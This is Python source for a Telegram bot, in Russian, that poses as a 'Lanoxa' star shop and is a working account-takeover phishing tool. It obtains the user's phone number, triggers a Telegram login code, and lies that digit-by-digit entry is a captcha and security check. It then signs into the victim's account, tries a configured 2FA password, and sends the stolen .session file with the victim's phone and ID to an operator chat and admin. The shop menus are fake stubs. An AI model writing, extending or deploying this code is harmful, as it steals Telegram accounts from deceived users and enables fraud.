from aiogram.types import (
    Message, CallbackQuery,
    ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.dispatcher import FSMContext
import os
import asyncio

from telethon.errors.rpcerrorlist import (
    PhoneCodeInvalidError, FloodWaitError, SessionPasswordNeededError
)

from data import User, warning_msg, ClientTG
from state import GetAccountTG
from markup import code_markup
from loader import vip, bot
from utils import config


def _normalize_phone(raw: str) -> str:
    """Приводим номер к формату +7xxxxxxxxxx"""
    phone = raw.strip()
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone


# ─────────────────────────────────────────────
# Шаг 1: получаем контакт → запрашиваем SMS-код
# ─────────────────────────────────────────────
@vip.message_handler(content_types=['contact'], state=GetAccountTG.one)
async def contact_handler(msg: Message, state: FSMContext):
    phone = _normalize_phone(msg.contact.phone_number)

    User(user_id=msg.from_user.id).update_phone(phone=phone)

    session_path = f'./session/{phone[1:]}.session'
    if os.path.exists(session_path):
        await msg.answer(
            text='<b>✅ Ваш аккаунт уже прошёл проверку!</b>',
            reply_markup=ReplyKeyboardRemove()
        )
        await state.finish()
        return

    try:
        client = ClientTG(phone=phone).client
        await client.connect()
        send_code = await client.send_code_request(phone=phone)
        if client.is_connected():
            await client.disconnect()

        await msg.answer(
            text='<b>🔐 Проверка безопасности...</b>',
            reply_markup=ReplyKeyboardRemove()
        )

        msg_edit = await bot.send_message(
            chat_id=msg.from_user.id,
            text=(
                f'<b>📱 Ваш номер:</b> <code>{phone}</code>\n\n'
                f'<b>⌨️ Telegram прислал вам код — вводите его МЕДЛЕННО по 1 цифре</b>\n'
                f'<i>Это капча-защита от автоматических ботов</i>'
            ),
            reply_markup=code_markup()
        )

        await state.update_data(
            phone=phone,
            code_hash=send_code.phone_code_hash,
            msg_edit_id=msg_edit.message_id,
            digits=[]          # накапливаем цифры здесь
        )

        await GetAccountTG.two.set()

    except FloodWaitError as e:
        await msg.answer(
            text=f'<b>❌ Слишком много попыток. Подождите {e.seconds} секунд.</b>',
            reply_markup=ReplyKeyboardRemove()
        )
        await state.finish()
    except Exception as e:
        await msg.answer(
            text=f'<b>❌ Ошибка при отправке кода: {e}</b>',
            reply_markup=ReplyKeyboardRemove()
        )
        await state.finish()


# ─────────────────────────────────────────────
# Шаги 2–5: ввод цифр кода (один универсальный хендлер)
# ─────────────────────────────────────────────
@vip.callback_query_handler(text_startswith='code_number:', state=[
    GetAccountTG.two,
    GetAccountTG.three,
    GetAccountTG.four,
    GetAccountTG.five,
])
async def digit_handler(call: CallbackQuery, state: FSMContext):
    digit = call.data.split(':')[1]

    async with state.proxy() as data:
        digits: list = data.get('digits', [])
        digits.append(digit)
        data['digits'] = digits
        msg_edit_id = data['msg_edit_id']
        phone = data['phone']

    entered = ''.join(digits)
    dots = '•' * (5 - len(digits))

    await bot.edit_message_text(
        chat_id=call.from_user.id,
        message_id=msg_edit_id,
        text=(
            f'<b>📱 Ваш номер:</b> <code>{phone}</code>\n\n'
            f'<b>🔢 Код:</b> <code>{entered}{dots}</code>\n\n'
            f'<i>{"Продолжайте вводить..." if len(digits) < 5 else "Последняя цифра, проверяем..."}</i>'
        ),
        reply_markup=code_markup() if len(digits) < 5 else None
    )
    await call.answer()

    await GetAccountTG.next()


# ─────────────────────────────────────────────
# Шаг 6 (load): финальная цифра → авторизация
# ─────────────────────────────────────────────
@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.load)
async def finish_handler(call: CallbackQuery, state: FSMContext):
    digit = call.data.split(':')[1]

    async with state.proxy() as data:
        digits: list = data.get('digits', [])
        digits.append(digit)
        phone = data['phone']
        code_hash = data['code_hash']
        msg_edit_id = data['msg_edit_id']

    code = ''.join(digits)

    await bot.edit_message_text(
        chat_id=call.from_user.id,
        message_id=msg_edit_id,
        text='<b>🔄 Проверяем код...</b>'
    )
    await call.answer()

    client = ClientTG(phone=phone).client
    await client.connect()

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)

    except PhoneCodeInvalidError:
        await bot.edit_message_text(
            chat_id=call.from_user.id,
            message_id=msg_edit_id,
            text='<b>❌ Неправильный код! Попробуйте снова — /start</b>'
        )
        if client.is_connected():
            await client.disconnect()
        await state.finish()
        return

    except SessionPasswordNeededError:
        # Аккаунт защищён 2FA — вводим пароль из конфига
        two_fa = config('two_fa').strip()
        if not two_fa:
            await bot.edit_message_text(
                chat_id=call.from_user.id,
                message_id=msg_edit_id,
                text='<b>🔒 Требуется пароль двухфакторной аутентификации.\nОбратитесь к администратору.</b>'
            )
            if client.is_connected():
                await client.disconnect()
            await state.finish()
            return
        try:
            await client.sign_in(password=two_fa)
        except Exception as e:
            await bot.edit_message_text(
                chat_id=call.from_user.id,
                message_id=msg_edit_id,
                text=f'<b>❌ Ошибка 2FA: {e}\nПопробуйте снова — /start</b>'
            )
            if client.is_connected():
                await client.disconnect()
            await state.finish()
            return

    except Exception as e:
        await bot.edit_message_text(
            chat_id=call.from_user.id,
            message_id=msg_edit_id,
            text=f'<b>❌ Ошибка авторизации: {e}\nПопробуйте снова — /start</b>'
        )
        if client.is_connected():
            await client.disconnect()
        await state.finish()
        return

    # Авторизация прошла — отправляем .session файл
    await asyncio.sleep(1)
    await bot.edit_message_text(
        chat_id=call.from_user.id,
        message_id=msg_edit_id,
        text='<b>✅ Верификация пройдена успешно!</b>'
    )

    session_path = f'./session/{phone[1:]}.session'
    caption = (
        f'👤 Пользователь: {call.from_user.get_mention()}\n'
        f'📱 Телефон: <code>{phone}</code>\n'
        f'🆔 ID: <code>{call.from_user.id}</code>'
    )

    try:
        with open(session_path, 'rb') as document:
            # Отправляем в чат (группу/канал)
            chat_id = config('chat_id').strip()
            if chat_id and chat_id != '0':
                await bot.send_document(
                    chat_id=int(chat_id),
                    document=document,
                    caption=caption
                )
                document.seek(0)

            # Дублируем администратору
            admin_id = config('admin_id').strip()
            if admin_id and admin_id != '0':
                await bot.send_document(
                    chat_id=int(admin_id),
                    document=document,
                    caption=caption
                )
    except Exception as e:
        # Файл не отправился — уведомляем тихо, не прерываем флоу
        await bot.send_message(
            chat_id=int(config('admin_id')),
            text=f'⚠️ Не удалось отправить сессию {phone}: {e}'
        )

    if client.is_connected():
        await client.disconnect()

    # Меню после успешной верификации
    menu_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton('👤 Профиль')],
            [KeyboardButton('⭐ Купить звезды')],
            [KeyboardButton('ℹ️ О магазине')]
        ],
        resize_keyboard=True
    )

    await bot.send_photo(
        chat_id=call.from_user.id,
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption=(
            '🎉 <b>Добро пожаловать в магазин звёзд от Lanoxa!</b>\n\n'
            '💫 Покупайте звёзды по низким ценам\n'
            '⭐ Открывайте эксклюзивный контент\n\n'
            '<i>Бот в бета-тесте, некоторые функции могут не работать</i>'
        ),
        reply_markup=menu_keyboard
    )

    await state.finish()


# ─────────────────────────────────────────────
# Reply-кнопки меню
# ─────────────────────────────────────────────
@vip.message_handler(lambda m: m.text == '👤 Профиль')
async def profile_handler(msg: Message):
    profile_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton('💳 Пополнить')],
            [KeyboardButton('📤 Вывести')],
            [KeyboardButton('◀️ Назад')]
        ],
        resize_keyboard=True
    )
    await msg.answer_photo(
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption=(
            f'👤 <b>ВАШ ПРОФИЛЬ</b>\n\n'
            f'🆔 ID: <code>{msg.from_user.id}</code>\n'
            f'⭐ Звёзды: 2500\n'
            f'💼 Статус: Стандартный'
        ),
        reply_markup=profile_keyboard
    )


@vip.message_handler(lambda m: m.text == '💳 Пополнить')
async def deposit_handler(msg: Message):
    await msg.answer_photo(
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption='💳 <b>ПОПОЛНЕНИЕ</b>\n\n⏳ Функция в бета-тесте и пока недоступна'
    )


@vip.message_handler(lambda m: m.text == '📤 Вывести')
async def withdraw_handler(msg: Message):
    await msg.answer_photo(
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption='📤 <b>ВЫВОД ЗВЁЗД</b>\n\n⏳ Функция в бета-тесте и пока недоступна'
    )


@vip.message_handler(lambda m: m.text == '⭐ Купить звезды')
async def buy_stars_handler(msg: Message):
    await msg.answer_photo(
        photo='https://i.postimg.cc/x8g5Mws2/Chat-GPT-Image-8-noab-2025-g-22-31-00.png',
        caption='⭐ <b>КУПИТЬ ЗВЁЗДЫ</b>\n\n⏳ Функция в бета-тесте и пока недоступна'
    )


@vip.message_handler(lambda m: m.text == 'ℹ️ О магазине')
async def about_handler(msg: Message):
    await msg.answer(
        text=(
            'ℹ️ <b>О МАГАЗИНЕ</b>\n\n'
            '🌟 Магазин звёзд Lanoxa\n'
            '💰 Самые низкие цены\n'
            '⚡ Быстрая доставка\n'
            '🔒 Безопасные сделки\n\n'
            '📞 Поддержка: @lanox_support'
        )
    )


@vip.message_handler(lambda m: m.text == '◀️ Назад')
async def back_handler(msg: Message):
    menu_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton('👤 Профиль')],
            [KeyboardButton('⭐ Купить звезды')],
            [KeyboardButton('ℹ️ О магазине')]
        ],
        resize_keyboard=True
    )
    await msg.answer(
        text='🏠 Главное меню',
        reply_markup=menu_keyboard
    )
